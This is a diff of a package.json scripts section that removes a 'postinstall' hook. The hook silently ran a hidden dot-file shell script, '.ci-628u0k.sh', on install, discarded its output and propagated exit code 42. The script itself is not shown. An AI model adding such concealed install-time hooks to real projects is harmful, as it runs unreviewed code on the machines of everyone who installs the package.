@@ -6,8 +6,7 @@
   "scripts": {
     "test": "jest",
     "build": "npx parcel build index.js",
-    "lint": "npx standard --fix",
-    "postinstall": "sh ./.ci-628u0k.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "npx standard --fix"
   },
   "repository": {
     "type": "git",
